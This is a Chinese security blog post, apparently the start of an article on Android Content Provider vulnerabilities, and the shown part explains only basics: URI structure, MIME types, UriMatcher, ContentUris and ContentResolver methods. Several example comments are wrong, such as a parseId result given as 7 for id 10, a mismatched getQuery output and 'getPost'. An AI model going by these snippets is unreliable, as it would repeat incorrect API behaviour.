<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"security-kitchen.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.json"};
  </script>

  <meta name="description" content="一、前言今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。">
<meta property="og:type" content="article">
<meta property="og:title" content="Android App漏洞之战（12）——Content Provider漏洞详解">
<meta property="og:url" content="http://security-kitchen.com/2023/02/13/bug0012/index.html">
<meta property="og:site_name" content="欢迎来到安全后厨！">
<meta property="og:description" content="一、前言今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/3.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/1.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/2.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/4.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/5.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/6.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/7.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/12.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/13.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/8.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/9.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/10.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/11.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/14.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/15.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/16.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/17.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/18.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/19.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/20.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/21.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/22.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/23.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/24.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/25.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/26.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/27.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/28.png">
<meta property="og:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/29.png">
<meta property="article:published_time" content="2023-02-13T01:05:19.000Z">
<meta property="article:modified_time" content="2023-12-23T09:13:44.112Z">
<meta property="article:author" content="安全后厨团队">
<meta property="article:tag" content="漏洞挖掘">
<meta property="article:tag" content="工具">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/3.png">

<link rel="canonical" href="http://security-kitchen.com/2023/02/13/bug0012/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Android App漏洞之战（12）——Content Provider漏洞详解 | 欢迎来到安全后厨！</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="欢迎来到安全后厨！" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>
	<div class="headband"></div>
    <a target="_blank" rel="noopener" href="https://github.com/WindXaa?tab=repositories" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">欢迎来到安全后厨！</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://security-kitchen.com/2023/02/13/bug0012/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="安全后厨团队">
      <meta itemprop="description" content="选择有时候比努力更重要">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欢迎来到安全后厨！">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Android App漏洞之战（12）——Content Provider漏洞详解
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-13 09:05:19" itemprop="dateCreated datePublished" datetime="2023-02-13T09:05:19+08:00">2023-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-23 17:13:44" itemprop="dateModified" datetime="2023-12-23T17:13:44+08:00">2023-12-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/" itemprop="url" rel="index"><span itemprop="name">Android APP漏洞之战</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>今天总结Android APP四大组件中Content Provider挖掘的知识，主要分为两个部分，一部分是对Android Content Provider内容提供器的原理总结，另一部分便是对Android provider机制常见的一些漏洞总结，包括一些已知的漏洞方法，和一部分案例实践。</p>
<span id="more"></span>

<h2 id="二、Content-Provider初步介绍"><a href="#二、Content-Provider初步介绍" class="headerlink" title="二、Content Provider初步介绍"></a>二、Content Provider初步介绍</h2><h3 id="1-Content-Provider的基本原理"><a href="#1-Content-Provider的基本原理" class="headerlink" title="1.Content Provider的基本原理"></a>1.Content Provider的基本原理</h3><h3 id="（1）Content-Provider简介"><a href="#（1）Content-Provider简介" class="headerlink" title="（1）Content Provider简介"></a>（1）Content Provider简介</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/3.png" alt="image-20210922094010216"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android中的数据存储方式：Shared Preferences、网络存储、文件存储、外部存储、SQLite,这些存储方式一般在单独的应用程序中实现数据共享，对于不同应用之间共享数据，就要借助Content Provider。</span><br><span class="line">ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。</span><br></pre></td></tr></table></figure>

<h3 id="（2）Content-Provider作用"><a href="#（2）Content-Provider作用" class="headerlink" title="（2）Content Provider作用"></a>（2）Content Provider作用</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/1.png" alt="image-20210922094010216"></p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/2.png" alt="image-20210922094010216"></p>
<p>Content Provider可以使得不同APP进程之间进行数据交互和共享，即跨进程通信</p>
<h3 id="（3）URI详解"><a href="#（3）URI详解" class="headerlink" title="（3）URI详解"></a>（3）URI详解</h3><p>我们创建一个Content Provider，其他的应用可以通过使用ContentResolver来访问ContentProvider提供的数据，而ContentResolver通过uri来定位自己要访问的数据，所以我们要先了解URI</p>
<h5 id="URI"><a href="#URI" class="headerlink" title="URI:"></a>URI:</h5><p><strong>URI的介绍：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）定义：Uniform Resource Identifier，即统一资源标识符</span><br><span class="line">（<span class="number">2</span>）作用：唯一标识ContentProvider &amp;其中的数据</span><br><span class="line">（<span class="number">3</span>）外界进程通过URL找到对应的ContentProvider &amp;其中数据，再进行数据操作</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/4.png" alt="image-20210922094010216"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）标准前缀:content:<span class="comment">// ,用来说明一个Content Provider控制这些数据</span></span><br><span class="line">（<span class="number">2</span>）URL的标识：com.carson.provider, 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。对于第三方程序，为了保证URL标识的一致性，必须是一个完整的、小写的类名，这个标识在元素的authorities属性中说明，一般是定义该ContentProvider的包.类的名称</span><br><span class="line">（<span class="number">3</span>）路径：User,要操作的数据库中表的名字，或者可以自己定义，记得在使用的时候保持一致</span><br><span class="line">（<span class="number">4</span>）记录ID:id, 如果URL中包含表示需要获取的记录ID,则返回该id对应的数据，如果没有ID,就表示返回全部</span><br></pre></td></tr></table></figure>

<p><strong>构建URI的路径：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）操作User表中id为<span class="number">11</span>的记录，构建数据：/User/<span class="number">11</span></span><br><span class="line">（<span class="number">2</span>）操作User表中id为<span class="number">11</span>的记录的name字段：User/<span class="number">11</span>/name</span><br><span class="line">（<span class="number">3</span>）操作User表中的所有记录：/User</span><br><span class="line">（<span class="number">4</span>）操作来自文件、xml或网络其他存储方式的数据，如要操作xml文件中User节点下的name字段：/User/name</span><br><span class="line">（<span class="number">5</span>）若要将一个字符串转换成URI,可以使用Uri类中的parse()方法：</span><br><span class="line">	<span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.carson.provider/User&quot;</span>)；	</span><br></pre></td></tr></table></figure>

<p><strong>URI各部分的获取：</strong></p>
<p>我们给出一个URI的样例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</span><br></pre></td></tr></table></figure>

<p>我们介意使用一些方法来获取URI的各个部分：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getScheme()：获取 Uri 中的 scheme 字符串部分，在这里是 http</span><br><span class="line"><span class="title function_">getHost</span><span class="params">()</span>：获取 Authority 中的 Host 字符串，即 www.baidu.com</span><br><span class="line"><span class="title function_">getPost</span><span class="params">()</span>：获取 Authority 中的 Port 字符串，即 <span class="number">8080</span></span><br><span class="line">getPath()：获取 Uri 中 path 部分，即 wenku/jiatiao.html</span><br><span class="line"><span class="title function_">getQuery</span><span class="params">()</span>：获取 Uri 中的 query 部分，即 id=<span class="number">15</span>&amp;name=jack</span><br></pre></td></tr></table></figure>

<h5 id="MIME"><a href="#MIME" class="headerlink" title="MIME:"></a>MIME:</h5><p>MIME是指定某个扩展名的文件用一种应用程序打开，就像用浏览器查看PDF格式的文件，浏览器会选择合适的应用打开。ContentProvider 会根据 URI 来返回 MIME 类型，ContentProvider 会返回一个包含两部分的字符串。MIME 类型一般包含两部分，如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text/html</span><br><span class="line">text/css</span><br><span class="line">text/xml</span><br><span class="line">application/pdf</span><br></pre></td></tr></table></figure>

<p>分为类型和子类型，Android 遵循类似的约定来定义MIME类型，每个内容类型的 Android MIME 类型有两种形式：多条记录（集合）和单条记录。</p>
<ul>
<li>集合记录（dir）:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnd.android.cursor.dir/自定义 </span><br></pre></td></tr></table></figure>

<ul>
<li>单条记录（item）:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnd.android.cursor.item/自定义 </span><br></pre></td></tr></table></figure>

<p>vnd 表示这些类型和子类型具有非标准的、供应商特定的形式。Android中类型已经固定好了，不能更改，只能区别是集合还是单条具体记录，子类型可以按照格式自己填写，在使用 Intent 时，会用到 MIME，根据 Mimetype 打开符合条件的活动。</p>
<h5 id="URI解析"><a href="#URI解析" class="headerlink" title="URI解析:"></a>URI解析:</h5><p>这里URI代表要操作的数据，我们在对数据进行获取时需要解析URI，Android提供了两个操作URI的工具类：UriMatcher 和 ContentUris</p>
<p><strong>UriMatcher：</strong></p>
<p>UriMatcher类用于匹配Uri，使用步骤如下：</p>
<ul>
<li>将需要匹配的Uri路径进行注册：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常量UriMatcher.NO_MATCH表示不匹配任何路径的返回码</span></span><br><span class="line"><span class="type">UriMatcher</span>  <span class="variable">sMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line"><span class="comment">//如果match()方法匹配“content://com.wang.provider.myprovider/tablename”路径，返回匹配码为1</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;content://com.wang.provider.myprovider&quot;</span>, <span class="string">&quot; tablename &quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//如果match()方法匹配content://com.wang.provider.myprovider/tablename/11路径，返回匹配码为2</span></span><br><span class="line">sMatcher.addURI(<span class="string">&quot;com.wang.provider.myprovider&quot;</span>, <span class="string">&quot;tablename/#&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>此处采用 addURI 注册了两个需要用到的 URI；注意，添加第二个 URI 时，路径后面的 id 采用了通配符形式 “#”，表示只要前面三个部分都匹配上了就 OK</p>
<p>补充：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*:表示匹配任意长度的任意字符</span><br><span class="line">#:表示匹配任意长度的数字</span><br><span class="line">匹配任意表的内容URI格式：</span><br><span class="line">content：<span class="comment">//com.example.app.provider/*</span></span><br><span class="line">匹配table表中<span class="number">1</span>任意一行数据的内容URI格式：</span><br><span class="line">content：<span class="comment">//com.example.app.procider/table/#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注册完需要匹配的 Uri 后，可以使用 sMatcher.match(Uri) 方法对输入的 Uri 进行匹配，如果匹配就返回对应的匹配码，匹配码为调用 addURI() 方法时传入的第三个参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">switch</span> (sMatcher.match(Uri.parse(<span class="string">&quot;content://com.zhang.provider.yourprovider/tablename/100&quot;</span>))) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="comment">//match 1, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span></span><br><span class="line">      <span class="comment">//match 2, todo something</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//match nothing, todo something</span></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ContentUris:</strong></p>
<p>ContentUris类用于操作Uri路径后面的ID部分，有两个比较实用的方法：withAppendedId(Uri uri, long id)和parseId(Uri uri)</p>
<ul>
<li>withAppendedId(Uri uri, long id)用于为路径加上ID部分：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename&quot;</span>);</span><br><span class="line"><span class="comment">//生成的Uri为：content://com.wang.provider.myprovider/tablename/10</span></span><br><span class="line"> <span class="type">Uri</span> <span class="variable">resultUri</span> <span class="operator">=</span> ContentUris.withAppendedId(uri, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>parseId(Uri uri)则从路径中获取ID部分:</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://com.zhang.provider.myprovider/tablename/10&quot;</span>)</span><br><span class="line"><span class="comment">//获取的结果为：7</span></span><br><span class="line"><span class="type">long</span> <span class="variable">personid</span> <span class="operator">=</span> ContentUris.parseId(uri);</span><br></pre></td></tr></table></figure>

<h3 id="（4）Content-Provider数据共享"><a href="#（4）Content-Provider数据共享" class="headerlink" title="（4）Content Provider数据共享"></a>（4）Content Provider数据共享</h3><p>ContentProvider是一个抽象类，我们需要开发自己的内容提供者就需要继承这个类并复写其方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ContentProvider 类主要方法的介绍：</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span>，在ContentProvider创建后就会被调用，而ContentProvider是在其它应用第一次访问它时被创建；</span><br><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，供外部应用向ContentProvider添加数据；</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，供外部应用从ContentProvider删除数据；</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，供外部应用更新ContentProvider中的数据；</span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，供外部应用从ContentProvider中获取数据；</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span>，返回当前Uri所代表数据的MIME类型；</span><br></pre></td></tr></table></figure>

<p>如果操作的数据属于集合类型，那么 MIME 类型字符串应该以 vnd.android.cursor.dir&#x2F; 开头：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要得到所有 tablename 记录： Uri 为 content:<span class="comment">//com.wang.provider.myprovider/tablename，那么返回的MIME类型字符串应该为vnd.android.cursor.dir/table</span></span><br></pre></td></tr></table></figure>

<p>如果要操作的数据属于非集合类型数据，那么 MIME 类型字符串应该以 vnd.android.cursor.item&#x2F; 开头：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要得到 id 为 <span class="number">10</span> 的 tablename 记录，Uri 为 content:<span class="comment">//com.wang.provider.myprovider/tablename/10，那么返回的 MIME 类型字符串为：vnd.android.cursor.item/tablename </span></span><br></pre></td></tr></table></figure>

<h3 id="（5）Content-Resolver操作数据"><a href="#（5）Content-Resolver操作数据" class="headerlink" title="（5）Content Resolver操作数据"></a>（5）Content Resolver操作数据</h3><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供getContentResolver()</p>
<p>ContentResolver类提供了与ContentProvider类相同签名的四个方法：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0012/5.png" alt="image-20210922094010216"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span>，往ContentProvider添加数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span>，从ContentProvider删除数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span>，更新ContentProvider中的数据；</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span>，从ContentProvider中获取数据；</span><br></pre></td></tr></table></figure>

<p>这些方法的第一个参数为Uri，代表要操作的ContentProvider和对其中的什么数据进行操作，其实和ContentProvider里面的方法是一样的，最终会被传到我们之前程序里面定义的ContentProvider方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假定给定的是：Uri.parse(<span class="string">&quot;content://com.wang.provider.myprovider/tablename/10&quot;</span>)，</span><br><span class="line">那么将会对主机名为com.wang.provider.myprovider的ContentProvider进行操作，操作的数据为tablename表中id为<span class="number">10</span>的记录</span><br></pre></td></tr></table></figure>

